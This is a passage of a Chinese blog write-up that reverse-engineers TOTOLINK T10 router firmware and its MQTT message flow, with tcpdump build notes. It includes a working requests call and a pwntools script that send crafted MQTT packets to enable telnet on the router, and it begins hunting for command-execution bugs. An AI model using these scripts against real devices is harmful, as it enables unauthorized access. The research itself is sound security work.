class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">56383</span>         ESTABLISHED <span class=\"number\">1329</span>/cs_broker</span><br><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">56383</span>         <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">1883</span>          ESTABLISHED <span class=\"number\">1335</span>/cste_sub</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据前面查到的端口可以进一步分析,首先1883是mqtt端口,cs_broker用了这个端口,所以它就是代理,那么需要找客户端和服务端,客户端很明显,就是&#x2F;cgi-bin&#x2F;cstecgi.cgi,那么服务端呢,也很明显了,就是cste_sub,它与代理始终建立了双向链接</p>\n<h3 id=\"4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢\"><a href=\"#4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢\" class=\"headerlink\" title=\"4.2.5 cgi-bin&#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?\"></a>4.2.5 cgi-bin&#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?</h3><p>​\t\t在这里与1883代理进行消息转发</p>\n<p>​\t\t<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514170632459.png\" alt=\"image-20230514170632459\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;set_CSTEinfo&quot;</span></span><br><span class=\"line\">Binary file ./lib/libmosquitto.so matches</span><br><span class=\"line\">Binary file ./web_cste/cgi-bin/cstecgi.cgi matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以发现这两个函数来自于libmosquitto.so这个库,所以说totolink的mqtt是基于这个库来运行的</p>\n<h3 id=\"4-2-6-mqtt代理如何和服务端和客户端通信的呢\"><a href=\"#4-2-6-mqtt代理如何和服务端和客户端通信的呢\" class=\"headerlink\" title=\"4.2.6 mqtt代理如何和服务端和客户端通信的呢?\"></a>4.2.6 mqtt代理如何和服务端和客户端通信的呢?</h3><p>​\t\t也就是说那么 cs_broker是怎么接收cgi-bin&#x2F;cstecgi.cgi的消息的呢? 又是怎么转发消息到cste_sub的呢?</p>\n<h4 id=\"4-2-6-1-mqtt代理与客户端通信\"><a href=\"#4-2-6-1-mqtt代理与客户端通信\" class=\"headerlink\" title=\"4.2.6.1 mqtt代理与客户端通信\"></a>4.2.6.1 mqtt代理与客户端通信</h4><p>​\t\t要有一个listen等待接收消息,cs_broker主函数中的mqtt3_socket_listen函数.获取传来的地址,解析数据,建立socket</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095808403.png\" alt=\"image-20230514095808403\"></p>\n<h4 id=\"4-2-6-2-与服务端通信\"><a href=\"#4-2-6-2-与服务端通信\" class=\"headerlink\" title=\"4.2.6.2 与服务端通信\"></a>4.2.6.2 与服务端通信</h4><p>​\t\t肯定要有一个connect进行连接</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095637378.png\" alt=\"image-20230514095637378\">\t</p>\n<h3 id=\"4-2-7-完整的流程\"><a href=\"#4-2-7-完整的流程\" class=\"headerlink\" title=\"4.2.7 完整的流程\"></a>4.2.7 完整的流程</h3><p>​\t分析完登陆和后台的这个功能大概梳理清楚了程序的运行逻辑,它不是直接调用后端的接口,而是通过mqtt通信到后端来处理请求然后返回,所以不论前端的什么请求,都会转化成mqtt的请求包,所以对80端口的请求,也可以通过构造mqtt数据包来执行</p>\n<p>​\t此外还分析了一下系统的启动流程等,最后总结成流程图</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094607650.png\" alt=\"image-20230514094607650\"></p>\n<h1 id=\"五、mqtt分析\"><a href=\"#五、mqtt分析\" class=\"headerlink\" title=\"五、mqtt分析\"></a>五、mqtt分析</h1><h2 id=\"5-1-抓包分析-以telnet为例\"><a href=\"#5-1-抓包分析-以telnet为例\" class=\"headerlink\" title=\"5.1 抓包分析:(以telnet为例)\"></a>5.1 抓包分析:(以telnet为例)</h2><h3 id=\"5-1-1-安装libpcap-x2F-tcpdump\"><a href=\"#5-1-1-安装libpcap-x2F-tcpdump\" class=\"headerlink\" title=\"5.1.1 安装libpcap&#x2F;tcpdump\"></a>5.1.1 安装libpcap&#x2F;tcpdump</h3><ol>\n<li>官网下载tcpdump和libpcap</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/the-tcpdump-group/tcpdump</span><br><span class=\"line\">git clone https://github.com/the-tcpdump-group/libpcap</span><br></pre></td></tr></table></figure>\n\n<p>Git clone的版本比较新,有所不同,可以用这个</p>\n<p><a href=\"https://www.tcpdump.org/old_releases.html\">https://www.tcpdump.org/old_releases.html</a></p>\n<h4 id=\"5-1-1-1-libpcap\"><a href=\"#5-1-1-1-libpcap\" class=\"headerlink\" title=\"5.1.1.1 libpcap\"></a>5.1.1.1 libpcap</h4><p>先安装两个依赖</p>\n<p>先安装flex</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#libpcap 1.1要求flex必须在2.4.6及以上</span></span><br><span class=\"line\">wget http:<span class=\"comment\">//prdownloads.sourceforge.net/flex/flex-2.5.36.tar.gz</span></span><br><span class=\"line\">tar -xzvf flex<span class=\"number\">-2.5</span><span class=\"number\">.36</span>.tar.gz</span><br><span class=\"line\">cd flex<span class=\"number\">-2.5</span><span class=\"number\">.36</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>安装bison</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//ftp.gnu.org/gnu/bison/bison-2.4.tar.gz</span></span><br><span class=\"line\">tar -xzvf bison<span class=\"number\">-2.4</span>.tar.gz</span><br><span class=\"line\">cd bison<span class=\"number\">-2.4</span>/</span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>安装libpcap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//www.tcpdump.org/release/libpcap-1.1.1.tar.gz</span></span><br><span class=\"line\">tar -xzvf libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span>.tar.gz</span><br><span class=\"line\">cd libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n\n<p>–prefix&#x3D;&#x2F;usr指定软件安装路径</p>\n<p>报错处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/net/libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span><span class=\"meta\"># make -j</span></span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -c scanner.c</span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -c ./pcap-linux.c</span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -Dyylval=pcap_lval -c grammar.c</span><br><span class=\"line\">./pcap-linux.c: In function ‘pcap_read_packet’:</span><br><span class=\"line\">./pcap-linux.c:<span class=\"number\">1555</span>:<span class=\"number\">24</span>: error: ‘SIOCGSTAMP’ undeclared (first use in this function); did you mean ‘SIOCGIWAP’?</span><br><span class=\"line\"> <span class=\"number\">1555</span> |  <span class=\"keyword\">if</span> (ioctl(handle-&gt;fd, SIOCGSTAMP, &amp;pcap_header.ts) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      |                        ^~~~~~~~~~</span><br><span class=\"line\">      |                        SIOCGIWAP</span><br><span class=\"line\">./pcap-linux.c:<span class=\"number\">1555</span>:<span class=\"number\">24</span>: note: each undeclared identifier is reported only once <span class=\"keyword\">for</span> each function it appears in</span><br><span class=\"line\">make: *** [Makefile:<span class=\"number\">81</span>: pcap-linux.o] Error <span class=\"number\">1</span></span><br><span class=\"line\">make: *** Waiting <span class=\"keyword\">for</span> unfinished jobs....</span><br><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/liangjian990709/article/details/111494494\">https://blog.csdn.net/liangjian990709/article/details/111494494</a></p>\n<p><a href=\"https://github.com/LibtraceTeam/libtrace/issues/117\">https://github.com/LibtraceTeam/libtrace/issues/117</a></p>\n<p>报错是说找不到这个宏的定义,找到出问题的文件pcap-linux.c,加上头文件即可 <strong>#include &lt;linux&#x2F;sockios.h&gt;</strong></p>\n<p>验证是否成功</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pcap.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> &#123;</span><br><span class=\"line\"><span class=\"type\">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class=\"line\"><span class=\"type\">pcap_if_t</span>* devs;</span><br><span class=\"line\"><span class=\"type\">pcap_if_t</span>* d;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取全部的dev</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"number\">-1</span> == pcap_findalldevs(&amp;devs, errbuf)) &#123;</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Could not list device: %s\\n&quot;</span>, errbuf);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">d = devs;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (d-&gt;next != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d:%s\\n&quot;</span>, i++, d-&gt;name);</span><br><span class=\"line\">d = d-&gt;next;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//释放所有获取的dev</span></span><br><span class=\"line\">pcap_freealldevs(devs);</span><br><span class=\"line\"><span class=\"keyword\">return</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>gcc test.c -lpcap -L&#x2F;usr&#x2F;lib&#x2F;libpcap.so</p>\n<p>-lpcap然后指定安装路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/net# ./a.out</span><br><span class=\"line\"><span class=\"number\">0</span>:docker0</span><br><span class=\"line\"><span class=\"number\">1</span>:tun0</span><br><span class=\"line\"><span class=\"number\">2</span>:enp1s0</span><br><span class=\"line\"><span class=\"number\">3</span>:virbr2</span><br><span class=\"line\"><span class=\"number\">4</span>:tap2</span><br><span class=\"line\"><span class=\"number\">5</span>:br-bb76d9e6caa6</span><br><span class=\"line\"><span class=\"number\">6</span>:any</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.coder4.com/archives/1001\">https://www.coder4.com/archives/1001</a></p>\n<h4 id=\"5-1-1-2-tcpdump\"><a href=\"#5-1-1-2-tcpdump\" class=\"headerlink\" title=\"5.1.1.2 tcpdump\"></a>5.1.1.2 tcpdump</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"comment\">//www.tcpdump.org/release/tcpdump-4.1.1.tar.gz</span></span><br><span class=\"line\">tar zxvf tcpdump<span class=\"number\">-4.1</span><span class=\"number\">.1</span>.tar.gz</span><br><span class=\"line\">cd tcpdump<span class=\"number\">-4.1</span><span class=\"number\">.1</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n\n<p>安装完直接命令输入 tcpdump进行测试</p>\n<h4 id=\"5-1-1-3-交叉编译mipsel版tcpdump\"><a href=\"#5-1-1-3-交叉编译mipsel版tcpdump\" class=\"headerlink\" title=\"5.1.1.3 交叉编译mipsel版tcpdump\"></a>5.1.1.3 交叉编译mipsel版tcpdump</h4><p>安装mipsel gcc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译libpcap (重新解压一份源码)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/home/test/mipsel_libpcap     #该目录根据情况更改</span><br><span class=\"line\">/configure --host=mipsel-linux --with-pcap=linux --prefix=/home/test/mipsel_libpcap</span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc</span><br><span class=\"line\">make install CC=mipsel-linux-gnu-gcc       #编译的libpcap安装到了/home/test/mipsel_libpcap目录下</span><br></pre></td></tr></table></figure>\n\n<p>编译tcpdump</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">动态链接</span><br><span class=\"line\">./configure </span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc CFLAGS=<span class=\"string\">&#x27;-I/home/test/mipsel_libpcap/include&#x27;</span> LDFLAGS=<span class=\"string\">&#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">静态链接</span><br><span class=\"line\">    </span><br><span class=\"line\">./configure</span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc CFLAGS=<span class=\"string\">&#x27;-I/home/test/mipsel_libpcap/include -static&#x27;</span> LDFLAGS=<span class=\"string\">&#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a -static&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译的时候报错,应该是版本太老了….然后….</p>\n<p>很多个版本一直报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> pcap_loop... no</span><br><span class=\"line\">configure: error: This is a bug, please follow the guidelines in CONTRIBUTING and include the</span><br><span class=\"line\">config.<span class=\"built_in\">log</span> file in your report.  If you have downloaded libpcap from</span><br><span class=\"line\">tcpdump.org, and built it yourself, please also include the config.<span class=\"built_in\">log</span></span><br><span class=\"line\">file from the libpcap source directory, the Makefile from the libpcap</span><br><span class=\"line\">  urce directory, and the output of the make process <span class=\"keyword\">for</span> libpcap, as</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>2010就好了</p>\n<p>不过最后还是有点问题,没有编译成功,暂时先放一下,在github上能搜到编译好的,先用着</p>\n<p><a href=\"https://github.com/badmonkey7/tcpdump-static\">https://github.com/badmonkey7/tcpdump-static</a></p>\n<h3 id=\"5-1-2-流量包分析\"><a href=\"#5-1-2-流量包分析\" class=\"headerlink\" title=\"5.1.2 流量包分析\"></a>5.1.2 流量包分析</h3><p>tcp开启监听,然后mqtt发送订阅(其实不行,这个包不完全,应该走80端口的服务才行)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>.&#x2F;tcpdump-mipsel -i any  -w .&#x2F;test1.pcap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./tcpdump-mipsel -i lo -w ./test.pcap</span><br></pre></td></tr></table></figure>\n\n<p>获取流量后,利用base64编码把数据包拿到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # 编码过程</span><br><span class=\"line\"># 将base64编码的内容保存到本地文件pcap64</span><br><span class=\"line\">cat pcap64 | base64 -d &gt; test.pcap          # 解码过程</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t不知道为什么一发送订阅,连接就挂了..所以开一个nohup来放到后台运行,断了后重新登录,kill掉进程就得到数据包了,并且如果想抓80的话,要多抓几个网卡,具体是哪个还没测试(-i any抓全部)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./tcpdump-mipsel -i lo -w ./test.pcap</span><br><span class=\"line\">tcpdump-mipsel: listening on lo, link-type <span class=\"title function_\">EN10MB</span> <span class=\"params\">(Ethernet)</span>, snapshot length 262144 bytes</span><br><span class=\"line\">Connection closed by foreign host.</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">./busybox-mipsel  nohup ./tcpdump-mipsel  -i any -w ./test.pcap</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到三次握手四次挥手以及订阅包,推送包等等</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514144610603.png\" alt=\"image-20230514144610603\"></p>\n<p>​\t\t基于上面分析,可以利用pwntools直接构造mqtt的数据包</p>\n<h3 id=\"5-1-3-利用pwntools构造mqtt的数据包\"><a href=\"#5-1-3-利用pwntools构造mqtt的数据包\" class=\"headerlink\" title=\"5.1.3 利用pwntools构造mqtt的数据包\"></a>5.1.3 利用pwntools构造mqtt的数据包</h3><p>​\t\t这条消息中的下面选中部分就是发送的设置telnet的mqtt publish报文,也就是脚本中的msg2</p>\n<p>31\t1.735248\t127.0.0.1\t127.0.0.1\tMQTT\t175\tPublish Message [totolink&#x2F;router&#x2F;setting&#x2F;setTelnetCfg]</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514145035879.png\" alt=\"image-20230514145035879\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;192.168.55.1&quot;</span>,<span class=\"number\">1883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">msg1 = <span class=\"string\">&quot;\\x10\\x1a\\x00\\x04\\x4d\\x51\\x54\\x54\\x04\\x02\\x00\\x3c\\x00\\x0e\\x4d\\x51\\x54\\x54\\x5f\\x46\\x58\\x5f\\x43\\x6c\\x69\\x65\\x6e\\x74&quot;</span></span><br><span class=\"line\">msg2 = <span class=\"string\">&quot;\\x30\\x65\\x00\\x24\\x74\\x6f\\x74\\x6f\\x6c\\x69\\x6e\\x6b\\x2f\\x72\\x6f\\x75\\x74\\x65\\x72\\x2f\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x7b\\x0a\\x09\\x22\\x74\\x6f\\x70\\x69\\x63\\x75\\x72\\x6c\\x22\\x3a\\x09\\x22\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x22\\x2c\\x0a\\x09\\x22\\x74\\x65\\x6c\\x6e\\x65\\x74\\x5f\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x22\\x3a\\x09\\x22\\x31\\x22\\x0a\\x7d&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.send(msg1)       <span class=\"comment\"># connect</span></span><br><span class=\"line\">sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">io.send(msg2)       <span class=\"comment\"># setTelnetCfg 1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-1-4-mqtt-fx使用\"><a href=\"#5-1-4-mqtt-fx使用\" class=\"headerlink\" title=\"5.1.4 mqtt.fx使用\"></a>5.1.4 mqtt.fx使用</h3><p><a href=\"https://blog.csdn.net/weixin_43940932/article/details/107935303\">https://blog.csdn.net/weixin_43940932/article/details/107935303</a></p>\n<p>​\t\t这是一个调试mqtt协议的工具, 先修改mqtt代理的ip,就是路由器的ip,</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509152828308.png\" alt=\"image-20230509152828308\"></p>\n<p>​\t\tsubscribe订阅 #是订阅全部</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153103381.png\" alt=\"image-20230509153103381\"></p>\n<p>publish,发送报文</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153124891.png\" alt=\"image-20230509153124891\"></p>\n<h1 id=\"六、so库命令执行漏洞挖掘\"><a href=\"#六、so库命令执行漏洞挖掘\" class=\"headerlink\" title=\"六、so库命令执行漏洞挖掘\"></a>六、so库命令执行漏洞挖掘</h1><p>​\t\t有命令执行的一般都要有system,execve 或者包装好的函数 CsteSystem,如果有交叉引用的漏洞函数,那么也可能存在命令执行</p>\n<p>一共9个文件.  后面有时间感觉可以写个ida脚本自动化来找…</p>\n<h2 id=\"6-1-system-so\"><a href=\"#6-1-system-so\" class=\"headerlink\" title=\"6.1 system.so\"></a>6.1 system.so</h2><p>主要包含下面的函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getPasswordCfg&quot;</span>, getPasswordCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setPasswordCfg&quot;</span>, setPasswordCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;NTPSyncWithHost&quot;</span>, NTPSyncWithHost);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getNTPCfg&quot;</span>, getNTPCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setNTPCfg&quot;</span>, setNTPCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getDDNSStatus&quot;</span>, getDDNSStatus);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getDDNSCfg&quot;</span>, getDDNSCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setDDNSCfg&quot;</span>, setDDNSCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSyslogCfg&quot;</span>, getSyslogCfg);</span><br><span class=\"line\">  